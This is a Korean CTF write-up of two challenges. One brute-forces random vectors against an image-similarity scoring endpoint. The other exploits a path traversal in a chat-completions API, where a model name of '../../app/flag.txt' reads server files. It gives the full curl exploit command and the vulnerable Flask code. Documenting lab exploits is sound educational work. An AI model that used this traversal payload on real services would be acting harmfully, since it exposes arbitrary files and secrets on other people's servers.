## overall
토요일, 18 4 2026, 08:00 KST - 월요일, 19 4 2026, 20:00 KST
### Team Rank
* 9264 score
* #6
### diary
오랜만에 주말에 일정이 없어서 풀었습니다 일정이 없다기보단 일정이 파토난거지만 ㅗ (뒤끝)
### misc
`s` 생일을 입력하면 톰크루즈랑 닮은 점수를 리턴하고 그게 0.15 이상이 되어야 플래그를 주는 문제

직관적으로 드는 생각은 /generate-random으로 브루트포스(년도/월/일) 하는 방법이 있겠지만 생일이 시드값으로 들어가기 때문에 완전히 무작위성으로 되어서 시간이 너무오래걸림 애초에 이미지를 생성하는 거라서 오래걸리기도 하고... 다행히 블랙박스가 아니기때문에 코드를 까보면 /submit-u(벡터로 제출)이라는 엔드포인트가 있는데 generate-random과는 다른 함수를 호출함 코드를 잘 읽어보면 8차원 u벡터를 PCA해서 사용한다는건데 음.. 자세한건 잘몰루겠고 이를테면 내가 찾은 정답벡터가 u = [-16.414, 20.267, -12.225, 13.809, -0.012, -9.959, -12.985, 3.964] 이거인데 이를테면 u[0]은 얼굴형.. u[1]은 피부색.. 이렇게 다 대응하는 값이 있고 그게 아마 pca_basis_d8_tom_weighted.npz에 들어가있는듯(안까봄) 아무튼 그래서 무작위 시드값이 아니라 벡터로 풀면 톰크루즈와 닮은 '영역'이 생기기 때문에 그리디하게 풀 수 있음

인텐솔브는 그리디하게 푸는거같은데 안타깝게도 나는 박치기하면서 랜덤값돌리니까 풀려버림
```
u_lower = np.array(health["u_lower"])
u_upper = np.array(health["u_upper"])
```
영역가져와서 (/health에 메타데이터가 있슴)
```
for i in range(20):
    u = np.random.uniform(u_lower, u_upper)
    resp = requests.post(f"{url}/submit-u", json={"u": u.tolist(), "include_image": False})
    result = resp.json()
    score = result["tom_score"]
    results.append((f"random_{i}", score, u.copy()))
    if i % 5 == 0:
        print(f"   Sample {i}: {score:.6f}")
```
랜덤을 박았더니? 안타깝게도 풀렸다. 인텐솔브를 만들려면 0.15가 너무 낮은 threshold값이었던듯. 

### web
`mb` 모델이 여러가지 종류가 있는데 여기에 `squ1rrel/squirrelgpt-wb`이런걸 박아서 보내는데 이게 경로처럼 생겨서(아니어딜봐서? 이딴걸 게싱해야한단말인가?) `squ1rrel/a/../squirrelgpt-2b` 나 `squ1rrel/letsgorubiyalab`같은걸 박아서 보내면 404 모델을 찾을 수 없다고 나오는데 `squ1rrel/squirrelgpt-wb/` 이렇게 디렉토리 경로를 박으면 500 flask에러가 나는걸로 봐서 경로를 그대로 찾아보는 구조라고 유추할 수 있음

exploit
```
curl -s -X POST https://model-behavior.squ1rrel.dev/v1/chat/completions -H 'Content-Type: application/json' -d '{"model":"../../app/flag.txt","messages":[]}'
```

암튼 모델명이 경로고 이 경로를 cat하는 레전드 취약점때문에 비슷하게 서버 코드도 유출할 수 있다. 이 서버에 있는 모든 파일을 유출할수있다임


취약점
```
model_path = f"models/{model}"
    try:
        with open(model_path) as f:
            raw = f.read()
        config = json.loads(raw)
    except FileNotFoundError:
        return jsonify({
            "error": {
                "message": f"Model '{model}' not found. Use GET /v1/models for available models.",
                "type": "invalid_request_error",
            }
        }), 404
    except json.JSONDecodeError:
        config = {"name": raw.strip(), "version": "unknown"}
```

cat
```
model_name = config.get("name", model) #raw.strip()이 들어가시겟됴...
...
return jsonify({
        "id": completion_id,
        "object": "chat.completion",
        "created": created,
        "model": model_name, #raw.strip()
        "choices": [{
            "index": 0,
            "message": {
                "role": "assistant",
                "content": response_text,
            },
            "finish_reason": "stop",
        }],
        "usage": {
            "prompt_tokens": pt,
            "completion_tokens": ct,
            "total_tokens": pt + ct,
        },
    })
```
